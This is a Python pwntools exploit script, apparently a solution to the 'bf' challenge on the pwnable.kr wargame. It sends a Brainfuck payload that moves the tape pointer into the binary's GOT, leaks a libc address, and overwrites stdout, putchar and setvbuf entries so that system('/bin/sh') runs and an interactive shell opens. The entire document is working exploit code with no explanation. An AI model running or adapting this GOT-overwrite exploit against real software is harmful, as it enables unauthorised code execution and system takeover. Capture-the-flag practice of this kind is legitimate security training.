from pwn import *
p=remote('pwnable.kr',9001)
#p=process('./bf')
#context.log_level='debug'

b=ELF('./bf')

#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
libc=ELF('./bf_libc.so')
tape=0x804a0a0

pay1=""
pay1+='<'*(tape-b.got['stdout'])
pay1+='.>.>.>.'+'<<<'
pay1+=',>,>,>,'+'<<<'
pay1+='<'*(b.got['stdout']-b.got['putchar'])
pay1+=',>,>,>,'+'<<<'
pay1+='<'*(b.got['putchar']-b.got['setvbuf'])
pay1+=',>,>,>,'+'<<<'
pay1+='.'

p.recvuntil('[ ]\n')
p.sendline(pay1)

sleep(1)

libc_base=u32(p.recv(4))-libc.symbols['stdout']+0x9c
system=libc_base+libc.symbols['system']
binsh=libc_base+libc.search('/bin/sh').next()

pay2=""
pay2+=p32(binsh)
pay2+=p32(b.symbols['main'])
pay2+=p32(system)

p.sendline(pay2)
p.interactive()
